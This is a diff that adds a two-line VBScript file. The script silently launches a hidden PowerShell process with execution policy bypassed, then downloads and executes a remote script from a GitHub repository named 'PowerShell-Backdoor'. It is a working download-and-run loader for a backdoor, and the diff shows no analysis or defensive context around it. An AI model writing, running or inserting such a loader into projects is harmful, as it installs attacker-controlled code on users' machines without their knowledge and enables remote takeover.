@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -Windowstyle Hidden -Exec Bypass -NonI -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/PowerShell-Backdoor/main/mfJtegnY.ps1');""", 0, True
